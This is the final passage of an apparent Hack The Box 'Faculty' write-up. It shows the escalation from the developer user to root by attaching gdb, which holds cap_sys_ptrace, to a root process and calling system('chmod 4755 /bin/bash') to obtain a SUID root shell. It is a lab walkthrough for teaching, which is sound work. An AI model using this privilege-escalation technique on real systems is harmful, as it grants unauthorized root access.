</span></span></code></pre></div><h2 id="shell-as-developer">Shell as developer</h2>
<h3 id="enumeration">Enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>developer@faculty:/tmp$ id
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>developer@faculty:/tmp$ find / -group debug 2&gt;/dev/null
</span></span><span style="display:flex;"><span>find / -group debug 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/gdb
</span></span></code></pre></div><p>Looks like only members of the <code>debug</code> group can execute <code>gdb</code> on this system. Let&rsquo;s dig into the binary and see if it has any special permissions or capabilities.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>developer@faculty:/tmp$ getcap /usr/bin/gdb
</span></span><span style="display:flex;"><span>getcap /usr/bin/gdb
</span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_sys_ptrace+ep
</span></span></code></pre></div><p>According to <a href="https://www.elastic.co/guide/en/security/current/privilege-escalation-via-gdb-cap-sys-ptrace.html" target="_blank">Elastic</a>, <code>gdb</code> with the <code>cap_sys_ptrace</code> capability can:</p>
<blockquote>
<p>Identifies instances where GDB (granted the CAP_SYS_PTRACE capability) is executed, after which the user’s access is elevated to UID/GID 0 (root). In Linux, the CAP_SYS_PTRACE capability grants a process the ability to use the ptrace system call, which is typically used for debugging and allows the process to trace and control other processes. Attackers may leverage this capability to hook and inject into a process that is running with root permissions in order to escalate their privileges to root.</p></blockquote>
<h3 id="gdb--cap_sys_ptrace">GDB + cap_sys_ptrace</h3>
<p>After looking at the Elastic article, and some other articles found through Google, we should be able to find a process that has access to system commands. Once we attach, we should be able to call any system commands we&rsquo;d like, and set the SUID permissions of <code>/bin/bash</code> to obtain a root shell.</p>
<h4 id="find-a-process">Find a Process</h4>
<p>Found a process running as <code>root</code> we can use using <code>ps auxww | grep root</code>:</p>
<p><code>root         684  0.0  0.9  26896 18152 ?        Ss   16:39   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers</code></p>
<h4 id="exploit">Exploit</h4>
<p>First, attach gdb to the process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>developer@faculty:/tmp$ gdb -q -p <span style="color:#ae81ff">684</span>
</span></span><span style="display:flex;"><span>Attaching to process <span style="color:#ae81ff">684</span>
</span></span><span style="display:flex;"><span>Reading symbols from /usr/bin/python3.8...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/bin/python3.8<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/c0/f40155b3f8bf8c494fa800f9ab197ebe20ed6e.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libutil.so.1...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/4f/3ee75c38f09d6346de1e8eca0f8d8a41071d9f.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/fe/91b4090ea04c1559ff71dd9290062776618891.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libexpat.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libexpat.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libz.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libz.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib64/ld-linux-x86-64.so.2...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libnss_files.so.2...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/45/da81f0ac3660e3c3cb947c6244151d879ed9e8.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libglib-2.0.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libglib-2.0.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libgobject-2.0.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libgobject-2.0.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libgirepository-1.0.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libgirepository-1.0.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libffi.so.7...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libffi.so.7<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libpcre.so.3...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libpcre.so.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libgmodule-2.0.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libgmodule-2.0.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libgio-2.0.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libgio-2.0.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libmount.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libmount.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libselinux.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libselinux.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libresolv.so.2...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/45/19041bde5b859c55798ac0745b0b6199cb7d94.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libblkid.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libblkid.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libpcre2-8.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libpcre2-8.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libdbus-1.so.3...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libdbus-1.so.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libsystemd.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libsystemd.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/debug/.build-id/ce/016c975d94bc4770ed8c62d45dea6b71405a2c.debug...
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/liblzma.so.5...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/liblzma.so.5<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/liblz4.so.1...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/liblz4.so.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libgcrypt.so.20...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libgcrypt.so.20<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libgpg-error.so.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libgpg-error.so.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x00007f5c80ab0967 in __GI___poll <span style="color:#f92672">(</span>fds<span style="color:#f92672">=</span>0x2626a60, nfds<span style="color:#f92672">=</span>3, timeout<span style="color:#f92672">=</span>-1<span style="color:#f92672">)</span> at ../sysdeps/unix/sysv/linux/poll.c:29
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span>      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
</span></span></code></pre></div><p>Verify and make system calls to set SUID permissions of <code>/bin/bash</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p system
</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>int <span style="color:#f92672">(</span>const char *<span style="color:#f92672">)}</span> 0x7f5c809f0290 &lt;__libc_system&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 4755 /bin/bash&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Detaching after vfork from child process 9630<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>$2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> quit
</span></span><span style="display:flex;"><span>A debugging session is active.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Inferior <span style="color:#ae81ff">1</span> <span style="color:#f92672">[</span>process 684<span style="color:#f92672">]</span> will be detached.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Quit anyway? <span style="color:#f92672">(</span>y or n<span style="color:#f92672">)</span> y
</span></span><span style="display:flex;"><span>Detaching from program: /usr/bin/python3.8, process <span style="color:#ae81ff">684</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Inferior <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>process 684<span style="color:#f92672">)</span> detached<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Get your root shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>developer@faculty:/tmp$ bash -p
</span></span><span style="display:flex;"><span>bash-5.0# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
</span></span></code></pre></div>
  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-jab/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Jab</a>
        
	    
            <div class="next-post">
                <a href="https://pL4sTiC1337.github.io/writeups/htb-giddy/?ref=footer"><span style="font-weight:bold;">Next »</span><br>HtB Giddy</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning">Scanning</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#nginx-1180---80tcp">nginx 1.18.0 - 80/tcp</a></li>
      </ul>
    </li>
    <li><a href="#initial-access">Initial Access</a>
      <ul>
        <li><a href="#sql-injection">SQL Injection</a></li>
        <li><a href="#mpdf-vulnerability">MPDF Vulnerability</a></li>
        <li><a href="#pass-the-password">Pass the Password</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-gbyolo">Shell as gbyolo</a>
      <ul>
        <li><a href="#mail">mail</a></li>
        <li><a href="#sudo--l">sudo -l</a></li>
        <li><a href="#meta-git">meta-git</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-developer">Shell as developer</a>
      <ul>
        <li><a href="#enumeration">Enumeration</a></li>
        <li><a href="#gdb--cap_sys_ptrace">GDB + cap_sys_ptrace</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
